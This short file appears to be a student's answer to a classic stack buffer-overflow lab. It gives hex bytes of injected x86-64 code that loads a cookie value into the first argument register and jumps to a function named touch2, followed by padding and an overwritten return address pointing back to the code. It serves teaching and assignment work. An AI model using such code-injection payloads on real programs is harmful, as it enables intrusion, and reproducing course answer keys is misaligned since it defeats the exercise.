48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi    # set the first argument to the value of cookie */
68 ec 17 40 00       	/* pushq  $0x4017ec  # push the addr of touch2 to stack */
c3                   	/* retq */

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00

78 dc 61 55             /* the address of the injection code  */
